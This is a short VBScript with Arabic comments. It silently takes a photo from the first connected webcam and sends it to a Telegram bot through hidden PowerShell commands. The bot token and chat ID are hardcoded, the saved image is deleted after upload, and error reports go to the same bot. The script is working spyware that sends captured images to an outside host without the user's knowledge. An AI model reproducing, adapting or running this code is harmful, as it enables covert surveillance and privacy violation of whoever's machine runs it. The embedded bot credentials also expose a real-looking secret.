Option Explicit

Dim botToken, chatId, shell, tempFolder, photoPath, errMsg
botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"

Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
photoPath = tempFolder & "\snap.jpg"

' تفعيل معالجة الأخطاء يدوياً
On Error Resume Next

Dim objDeviceManager, objDevice, objItem
Set objDeviceManager = CreateObject("WIA.DeviceManager")

' التحقق من الأخطاء أثناء الاتصال بالكاميرا
If Err.Number <> 0 Then
    SendTelegramMessage "خطأ في الاتصال بالكاميرا: " & Err.Description
    WScript.Quit
End If

If objDeviceManager.DeviceInfos.Count > 0 Then
    Set objDevice = objDeviceManager.DeviceInfos(1).Connect
    
    ' التقاط الصورة
    For Each objItem In objDevice.Items
        objItem.Transfer("{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}").SaveFile photoPath
    Next
    
    ' التحقق من وجود الصورة قبل الإرسال
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If fso.FileExists(photoPath) Then
        ' إرسال الصورة
        Dim psCommand
        psCommand = "powershell -Command ""$url = 'https://api.telegram.org/bot" & botToken & "/sendPhoto'; " & _
                    "$form = @{'chat_id'='" & chatId & "'; 'photo'=[System.IO.File]::ReadAllBytes('" & photoPath & "')}; " & _
                    "try { Invoke-RestMethod -Uri $url -Method Post -Form $form; Remove-Item -Path '" & photoPath & "' -Force } catch { exit 1 }"""
        
        shell.Run psCommand, 0, True
        
        ' إذا فشل الـ PowerShell في الإرسال (exit code 1)
        If shell.Run(psCommand, 0, True) <> 0 Then
            SendTelegramMessage "فشل إرسال الصورة عبر الشبكة أو خطأ في الاتصال."
        End If
    Else
        SendTelegramMessage "فشل التقاط الصورة: الملف غير موجود."
    End If
Else
    SendTelegramMessage "خطأ: لم يتم العثور على أي كاميرا متصلة."
End If

' وظيفة فرعية لإرسال رسائل نصية للبوت عند حدوث خطأ
Sub SendTelegramMessage(msg)
    Dim psError
    psError = "powershell -Command ""Invoke-RestMethod -Uri 'https://api.telegram.org/bot" & botToken & "/sendMessage' -Method Post -Body @{'chat_id'='" & chatId & "'; 'text'='" & msg & "'}"""
    shell.Run psError, 0, True
End Sub

' تنظيف الذاكرة
Set objDevice = Nothing
Set objDeviceManager = Nothing
Set shell = Nothing
